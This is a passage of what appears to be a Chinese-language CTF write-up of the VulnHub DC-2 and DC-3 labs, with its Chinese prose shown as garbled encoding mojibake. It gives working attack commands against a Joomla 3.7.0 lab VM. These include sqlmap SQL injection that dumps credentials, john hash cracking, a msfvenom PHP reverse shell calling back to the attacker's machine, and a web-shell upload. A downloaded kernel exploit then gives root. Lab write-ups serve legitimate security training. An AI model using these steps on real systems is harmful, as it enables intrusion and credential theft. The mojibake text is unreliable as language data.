id="æ³•-1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"><a href="#æ³•-1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell" class="headerlink" title="æ³• 1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"></a>æ³• 1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</h3><p><code>$</code>å˜æˆ<code>#</code>æˆåŠŸ</p><p><img src="/2022/08/29/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></p><h3 id="æ³•-2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•"><a href="#æ³•-2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•" class="headerlink" title="æ³• 2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•"></a>æ³• 2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</h3><p><img src="/2022/08/29/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></p><p><code>$</code>å˜æˆ<code>#</code>ï¼ŒæˆåŠŸç™»å½•</p><p><img src="/2022/08/29/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></p><p>ç„¶ååˆ°<code>/root</code>ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°æœ€åçš„ <code>flag</code></p><p><img src="/2022/08/29/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><blockquote><p><code>Congratulatons!!!</code></p><p><code>A special thanks to all those who sent me tweets</code><br><code>and provided me with feedback - it&#39;s all greatly</code><br><code>appreciated.</code></p><p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code><br>æ„æ€æ˜¯ï¼š</p><p>æ­å–œï¼ï¼ï¼</p><p>ç‰¹åˆ«æ„Ÿè°¢æ‰€æœ‰ç»™æˆ‘å‘æ¨æ–‡çš„äºº</p><p>å¹¶å‘æˆ‘æä¾›äº†åé¦ˆ-éå¸¸æ£’<br>è°¢è°¢ã€‚</p><p>å¦‚æœæ‚¨å–œæ¬¢è¿™ä¸ªCTFï¼Œè¯·é€šè¿‡@DCAU7ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡</p></blockquote><p><strong>5ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p><hr><h1 id="ä¸‰ã€DC-3-åˆçº§"><a href="#ä¸‰ã€DC-3-åˆçº§" class="headerlink" title="ä¸‰ã€DC-3[åˆçº§]"></a>ä¸‰ã€DC-3[åˆçº§]</h1><p><strong>only one flag</strong></p><h2 id="ä¿¡æ¯æ”¶é›†-2"><a href="#ä¿¡æ¯æ”¶é›†-2" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ã€å‰é¢çš„é¶æœº<code>ip</code>å¯»æ‰¾ï¼ŒæŒ‰ä¹‹å‰çš„æ­¥éª¤å³å¯ã€‘</p><p>å…ˆç”¨<code>nmap</code>æ‰«ä¸€ä¸‹æˆ‘ä»¬çš„é¶æœº<code>ip</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></p><p>çœ‹åˆ°åªæœ‰<code>80</code>ç«¯å£ï¼Œè¿è¡Œç€ä¸€ä¸ª<code>http</code>æœåŠ¡ï¼Œä¸­é—´ä»¶ä¸º<code>apache2.4.18</code></p><p>å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆ<code>CMS</code>ï¼‰æ˜¯<code>joomla</code></p><p><img src="/2022/08/29/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></p><p>åˆ©ç”¨æ’ä»¶<code>wappalyzer</code>ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°å…¶<code>CMS</code>ä¸º<code>joomla</code></p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>kali</code>åŒ…å½“ä¸­è‡ªå¸¦çš„<code>joomscan</code>å·¥å…·å¯¹å…¶è¿›è¡Œæ‰«æ</p><blockquote><p>æ¼æ´æ‰«æå™¨ï¼ˆJoomScanï¼‰æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯å®ç°æ¼æ´æ£€æµ‹çš„è‡ªåŠ¨åŒ–ï¼Œä»¥å¢å¼ºJoomla CMSå¼€å‘çš„å®‰å…¨æ€§ã€‚è¯¥å·¥å…·åŸºäºPerlå¼€å‘ï¼Œèƒ½å¤Ÿè½»æ¾æ— ç¼åœ°å¯¹å„ç§Joomlaé¡¹ç›®è¿›è¡Œæ¼æ´æ‰«æï¼Œå…¶è½»é‡åŒ–å’Œæ¨¡å—åŒ–çš„æ¶æ„èƒ½å¤Ÿä¿è¯æ‰«æè¿‡ç¨‹ä¸­ä¸ä¼šç•™ä¸‹è¿‡å¤šçš„ç—•è¿¹ã€‚å®ƒä¸ä»…èƒ½å¤Ÿæ£€æµ‹å·²çŸ¥æ¼æ´ï¼Œè€Œä¸”è¿˜èƒ½å¤Ÿæ£€æµ‹åˆ°å¾ˆå¤šé”™è¯¯é…ç½®æ¼æ´å’Œç®¡ç†æƒé™æ¼æ´ç­‰ç­‰ã€‚è¿˜èƒ½å¤Ÿä»¥HTMLæˆ–æ–‡æœ¬æ ¼å¼å¯¼å‡ºæ‰«ææŠ¥å‘Šã€‚</p></blockquote><p>ã€æ²¡æœ‰çš„ï¼Œå¯èƒ½éœ€è¦æ›´æ–°åŒ…ï¼Œç„¶åç›´æ¥ä¸‹è½½å³å¯ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></p><blockquote><p>è¾“å…¥<code>joomscan -u 192.168.133.139</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220902185954570.png" alt="image-20220902185954570"></p><p>æ‰«æå‘ç°äº†ï¼Œç®¡ç†å‘˜çš„ç™»å½•ç½‘å€<code>http://192.168.133.139/administrator/</code></p><p><img src="/2022/08/29/vulnhub/image-20220902190312468.png" alt="image-20220902190312468"></p><p>ä½†æ˜¯ä¸çŸ¥é“ç”¨æˆ·åå’Œå¯†ç </p><hr><p>å‘ç°å…¶<code>joomla</code>ç‰ˆæœ¬ä¸º<code>3.7.0</code></p><p><img src="/2022/08/29/vulnhub/image-20220902194849302.png" alt="image-20220902194849302"></p><p>ä½†æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¯¥ç‰ˆæœ¬æœ‰å“ªäº›æ¼æ´ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ° <code>kali</code>çš„<code>Exploit-DB</code>å·¥å…·</p><p>å¯ä»¥åœ¨æµè§ˆå™¨é‡Œçš„<code>Exploit-DB</code>ç½‘å€è¿›è¡ŒæŸ¥è¯¢ã€ä¸è¿‡å› ä¸ºæ˜¯å›½å¤–ç½‘å€æœ‰ç‚¹å¡ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></p><p>ç„¶åå¯»æ‰¾ä¸‹è½½payload</p><hr><p>ä¹Ÿå¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤æŸ¥è¯¢ã€ä¹Ÿæ˜¯åŸºäº<code>Exploit-DB</code>çš„å‘½ä»¤è¡Œæœç´¢å·¥å…·,å¯ä»¥å¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾æ¸—é€æ¨¡å—ã€‘</p><blockquote><p>è¾“å…¥<code>searchsploit joomla 3.7.0</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></p><p>å¯ä»¥çœ‹åˆ°<code>joomla 3.7.0</code>ç‰ˆæœ¬å­˜åœ¨<code>sqlæ³¨å…¥</code>çš„æ¼æ´</p><p> ç„¶åæŸ¥çœ‹<code>Path</code></p><blockquote><p>è¾“å…¥<code>searchsploit -p 42033</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></p><p><code>Path</code>å°±æ˜¯è¯¥æ¼æ´åˆ©ç”¨æ–¹æ³•çš„æ–‡æœ¬åœ°å€</p><blockquote><p>è¾“å…¥<code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></p><p>å¯ä»¥çœ‹åˆ°è¯¥æ¼æ´çš„æµ‹è¯•å¹³å°ï¼Œæ—¶é—´ï¼Œè¿˜æœ‰æ¼æ´çš„<code>CVE</code>ç¼–å·</p><p>å…³é”®åœ¨å®ƒç»™å‡ºçš„<code>sqlmap</code>æ³¨å…¥çš„æ¨¡æ¿</p><blockquote><p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p><p>&#x2F;&#x2F;æŠŠlocalhostæ”¹æˆé¶æœºipå³å¯</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></p><p>è¿è¡Œ</p><p><img src="/2022/08/29/vulnhub/image-20220903125921853.png" alt="image-20220903125921853"></p><p>å‘ç°äº†é¶æœºä¸‹çš„æ•°æ®åº“ï¼Œæˆ‘ä»¬æ‰€éœ€è¦çš„å°±æ˜¯<code>joomladb</code></p><blockquote><p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</code></p><p>&#x2F;&#x2F;åœ¨åŸæœ‰çš„payloadååŠ ä¸Š-D joomladbï¼Œé€‰å®šæ•°æ®åº“<br>&#x2F;&#x2F;å†åœ¨åé¢åŠ ä¸Šâ€“tablesï¼Œè¾“å‡ºè¯¥æ•°æ®åº“çš„è¡¨</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903130545749.png" alt="image-20220903130545749"></p><p>ç„¶åå¯ä»¥çœ‹åˆ°<code>#__users</code>çš„è¡¨ï¼Œé‡Œé¢å¾ˆå¯èƒ½æœ‰çº¿ç´¢</p><blockquote><p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</code></p><p>&#x2F;&#x2F;å’Œä¸Šä¸€æ­¥ç±»ä¼¼ï¼Œä½†æ³¨æ„è¡¨åæœ‰#ï¼Œæ‰€ä»¥éœ€è¦ç”¨å¼•å·æ¡†èµ·æ¥ï¼Œä¸ç„¶åé¢è¯­å¥å…¨è¢«æ³¨é‡Šäº†<br>&#x2F;&#x2F;*æ³¨ï¼Œsqlmapæç¤ºæŒ‰é»˜è®¤æ¨èå°±å¥½</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903131111592.png" alt="image-20220903131111592"></p><p>çœ‹åˆ°<code>username</code>å’Œ<code>password</code>ï¼ŒæŸ¥çœ‹åˆ—é‡Œå†…å®¹</p><blockquote><p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump</code><br>&#x2F;&#x2F;dumpè·å–å­—æ®µä¸­çš„æ•°æ®</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903133516906.png" alt="image-20220903133516906"></p><p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p><p>ä½†æ˜¯å¯†ç è¢«åŠ å¯†äº†ï¼Œé‚£å°±åªèƒ½ç”¨ä¸€äº›å·¥å…·è¿›è¡Œè§£å¯†</p><p>å…ˆç”Ÿæˆä¸€ä¸ªåŠ å¯†å¯†ç çš„æ–‡æœ¬æ–‡ä»¶</p><blockquote><p>è¾“å…¥<code>vi passwd.txt</code><br>ç„¶åæŠŠåŠ å¯†æ•°æ®å¤åˆ¶è¿›å»<br><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903134307088.png" alt="image-20220903134307088"></p><h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>ç„¶åæˆ‘ä»¬å°±éœ€è¦ç”¨ä¸€ä¸ªè§£å¯†å·¥å…·<code>john</code></p><p><code>John</code>æ˜¯ä¸€ä¸ªç ´è§£ç³»ç»Ÿå¯†ç çš„å·¥å…·</p><p>ä½¿ç”¨å¾ˆç®€å•</p><blockquote><p>è¾“å…¥<code>john passwd.txt</code></p><p>&#x2F;&#x2F;åé¢æ¥çš„æ˜¯å¯†ç æ–‡æœ¬æ–‡ä»¶</p></blockquote><p>ç„¶åè¾“å…¥</p><blockquote><p><code>john --show passwd.txt</code><br>&#x2F;&#x2F;æŸ¥çœ‹çˆ†ç ´æˆåŠŸçš„å¯†ç ï¼Œå‘ç°çˆ†ç ´æˆåŠŸ</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903140126704.png" alt="image-20220903140126704"></p><p>å¾—åˆ°å¯†ç <code>snoopy</code></p><p>ç„¶åç™»å½•åå°ç½‘å€</p><blockquote><p>ç”¨æˆ·åï¼š<code>admin</code><br>å¯†ç ï¼š<code>snoopy</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903140604935.png" alt="image-20220903140604935"></p><p>ç™»å½•æˆåŠŸï¼Œç„¶åæ‘¸ç´¢åˆ†æä¸€ä¸‹ç½‘ç«™</p><p>ç„¶ååœ¨<code>Extensions</code>â€“&gt;<code>Template</code></p><p><img src="/2022/08/29/vulnhub/image-20220903142609240.png" alt="image-20220903142609240"></p><p><img src="/2022/08/29/vulnhub/image-20220903142440563.png" alt="image-20220903142440563"></p><p>å‘ç°æœ‰ä¸ª<code>new file</code>ï¼Œå¯ä»¥æ–°å»ºæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥æ–°å»ºä¸€ä¸ªæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ï¼Œæ‹¿å–é¶æœºçš„<code>shell</code></p><h2 id="åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell"><a href="#åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell" class="headerlink" title="åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell"></a>åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell</h2><h3 id="æ³•1"><a href="#æ³•1" class="headerlink" title="æ³•1"></a>æ³•1</h3><p><strong>msfvenom</strong></p><h4 id="msfç”Ÿæˆæœ¨é©¬"><a href="#msfç”Ÿæˆæœ¨é©¬" class="headerlink" title="msfç”Ÿæˆæœ¨é©¬"></a>msfç”Ÿæˆæœ¨é©¬</h4><blockquote><p>è¾“å…¥<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=kaliçš„ip LPORT=4444 -f raw &gt; shell.php</code><br>&#x2F;&#x2F;æ³¨æ„ï¼ŒLHOSTæ˜¯kaliçš„ip</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903222910397.png" alt="image-20220903222910397"></p><blockquote><p>è¾“å…¥<code>ls</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903144052531.png" alt="image-20220903144052531"></p><p>å‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº† <code>shell.php</code></p><blockquote><p>è¾“å…¥<code>cat shell.php</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></p><p>å¾—åˆ°é¶æœºå¯¹åº”çš„æœ¨é©¬</p><p>ç„¶ååœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ª<code>php</code>æ–‡ä»¶</p><p><img src="/2022/08/29/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></p><p>ç„¶åæŠŠæœ¨é©¬å†…å®¹å¯¼å…¥è¿›å»</p><p><img src="/2022/08/29/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></p><p> ç„¶åä¿å­˜ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></p><p>ç„¶åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°æœ¨é©¬æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡Œè®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½è®¿é—®æˆåŠŸ</p><p>å› ä¸ºæˆ‘ä»¬æ–‡ä»¶æ˜¯åœ¨<code>/templates/protostar/</code>ä¸‹ä¸Šä¼ çš„ï¼Œæ‰€ä»¥è®¿é—®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></p><p>çœ‹åˆ°<code>/*</code>ï¼Œçœ‹æ¥æ˜¯å¯ä»¥æˆåŠŸè®¿é—®</p><h5 id="msfåˆ©ç”¨æœ¨é©¬"><a href="#msfåˆ©ç”¨æœ¨é©¬" class="headerlink" title="msfåˆ©ç”¨æœ¨é©¬"></a>msfåˆ©ç”¨æœ¨é©¬</h5><p>ç„¶åç”¨<code>msf</code>è¿›è¡Œåˆ©ç”¨</p><blockquote><p>å…ˆè¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msf</p></blockquote><blockquote><p>ç„¶åè¾“å…¥<br><code>use exploit/multi/handler</code></p><p><code>set payload php/meterpreter/reverse_tcp</code><br>è¿›å…¥æˆ‘ä»¬åˆ©ç”¨msfåˆ¶ä½œçš„æœ¨é©¬åˆ©ç”¨ç¯å¢ƒ</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903220102252.png" alt="image-20220903220102252"></p><blockquote><p>è¾“å…¥<code>show options</code><br>çœ‹çœ‹éœ€è¦å¡«å†™ä»€ä¹ˆ</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903220250819.png" alt="image-20220903220250819"></p><p>çœ‹åˆ°LHOSTç›‘å¬çš„ipæ²¡æœ‰å¡«å†™</p><blockquote><p>è¾“å…¥<code>set LHOST 192.168.133.140</code>  &#x2F;&#x2F;kaliçš„ip</p></blockquote><blockquote><p>è¾“å…¥<code>run</code>ï¼Œè¿è¡Œ</p></blockquote><p>è¿™é‡Œå°±æ˜¯åœ¨ç­‰å¾…æˆ‘ä»¬çš„æœ¨é©¬è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åˆ·æ–°ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰è®¿é—®æœ¨é©¬çš„ç½‘é¡µ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220903223440029.png" alt="image-20220903223440029"></p><p>ç„¶åè¾“å…¥</p><blockquote><p>è¾“å…¥<code>shell</code></p><p>ç„¶åè¾“å…¥<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>&#x2F;&#x2F;è¿›å…¥äº¤äº’å¼shellï¼Œå½“ç„¶ä¸å«Œçœ‹ç€éº»çƒ¦ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œåé¢å‘½ä»¤</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903223812256.png" alt="image-20220903223812256"></p><h5 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h5><blockquote><p>è¾“å…¥<code>ls</code>,ç®€å•çœ‹çœ‹æ–‡ä»¶</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220903224116654.png" alt="image-20220903224116654"></p><blockquote><p>è¾“å…¥<code>uname -a</code><br>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></p><p>çœ‹åˆ°<code>unbuntu</code>æ˜¯<code>2016</code>å¹´<code>4</code>æœˆå‘å¸ƒçš„ï¼Œæ‰€ä»¥æ˜¯<code>unbuntu16.04</code></p><p><code>linux</code>ç‰ˆæœ¬æ˜¯<code>4.4.0-21</code>ç‰ˆ</p><p>æ‰€ä»¥æ ¹æ®è¿™ä¸ªç‰ˆæœ¬çœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œæ¥æ–¹ä¾¿æˆ‘ä»¬ææƒ</p><blockquote><p>è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰ç”¨è¿‡çš„<br><code>searchsploit unbuntu 16.04</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></p><p><strong>double-fdput()</strong> ,è¿™æ˜¯è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³å¯è·å–<code>root</code>æƒé™</p><p>æˆ‘ä»¬æŠŠå®ƒå†…å®¹æ˜¾ç¤ºå‡ºæ¥</p><blockquote><p>è¾“å…¥<code>searchsploit -p 39772</code>æ˜¾ç¤ºæ–‡æœ¬è·¯å¾„<br>   <code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code> æ˜¾ç¤ºå†…å®¹</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></p><p>åœ¨æœ€åçœ‹åˆ°è¯¥æ¼æ´åˆ©ç”¨çš„<code>exp</code>ä¸‹è½½é“¾æ¥</p><p><img src="/2022/08/29/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></p><p>ä¸‹è½½æœ€åä¸€ä¸ªé“¾æ¥çš„å‹ç¼©åŒ…</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æˆ‘ä»¬çš„ç½‘ç«™åå°ä¸Šä¼ ä¸Šå»ï¼Œå’Œåˆ›å»ºæœ¨é©¬æ–‡ä»¶æ—¶å€™ä¸€æ ·</p><p><img src="/2022/08/29/vulnhub/image-20220904101055473.png" alt="image-20220904101055473"></p><p>ç»“æœæŠ¥é”™äº†</p><p><img src="/2022/08/29/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></p><p>çœ‹æ¥è¿™ä¸ªç½‘ç«™ä¸Šä¼ å¤„æ˜¯ä¸èƒ½ä¸Šä¼ å‹ç¼©åŒ…æ–‡ä»¶çš„</p><p>æ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨å·¥å…·è¿›è¡Œç›´æ¥ä¸Šä¼ äº†ï¼Œæ¯”å¦‚èšå‰‘æˆ–è€…èœåˆ€ç­‰å·¥å…·</p><p>æˆ‘ä»¬å’Œä¹‹å‰ä¸€æ ·æ–°å»ºä¸€ä¸ª<code>php</code>æ–‡ä»¶å†™ä¸Šæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬</p><p><img src="/2022/08/29/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></p><p>ç”¨èšå‰‘è¿æ¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></p><p>ç„¶åæŠŠæˆ‘ä»¬çš„å‹ç¼©åŒ…æ”¾åœ¨ç›®å½•ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></p><p>ç„¶åè¿”å›<code>msf</code></p><blockquote><p>è¾“å…¥<code>ls</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></p><p>å‘ç°å‹ç¼©åŒ…å·²ç»åœ¨é‡Œé¢äº†</p><p>ç„¶åè§£å‹ç¼©</p><blockquote><p>è¾“å…¥<code>unzip 39772.zip</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904113114803.png" alt="image-20220904113114803"></p><p>å‘ç°ç›®å½•ä¸‹å¤šäº†ä¸ª<code>39772</code>çš„ç›®å½•</p><blockquote><p>è¾“å…¥<code>cd 39772</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904113213562.png" alt="image-20220904113213562"></p><p>å‘ç°æœ‰ä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>exploit.tar</code></p><blockquote><p>è¾“å…¥<code>tar -xvf exploit.tar</code> &#x2F;&#x2F;è§£å‹ç¼©</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904113439714.png" alt="image-20220904113439714"></p><p>å‘ç°å¤šäº†ä¸ª<code>ebpf_mapfd_doubleput_exploit</code>ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220904113541560.png" alt="image-20220904113541560"></p><p>å‘ç°æœ‰ä¸ª<code>compile.sh</code></p><p>è¿è¡Œ</p><blockquote><p>è¾“å…¥<code>./compile.sh</code></p></blockquote><p>å‘ç°ç›®å½•ä¸‹æœ‰å¤šäº†ä¸€ä¸ª<code>doubleput</code></p><p><img src="/2022/08/29/vulnhub/image-20220904113730537.png" alt="image-20220904113730537"></p><p>è¿™å°±æ˜¯ææƒæ–‡ä»¶ï¼Œè¿è¡Œä¸€ä¸‹</p><blockquote><p>è¾“å…¥<code>./doupleput</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904114028987.png" alt="image-20220904114028987"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span>ï¼Œçœ‹çœ‹ææƒæˆåŠŸæ²¡</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></p><p>ææƒæˆåŠŸ</p><p>ç„¶åæˆ‘ä»¬åˆ°<code>/root</code>ç›®å½•ä¸‹æŸ¥çœ‹ <code>flag</code></p><p><img src="/2022/08/29/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></p><hr><blockquote><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line"> \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">   \_/\_/ \___|<span class="string">_</span>|<span 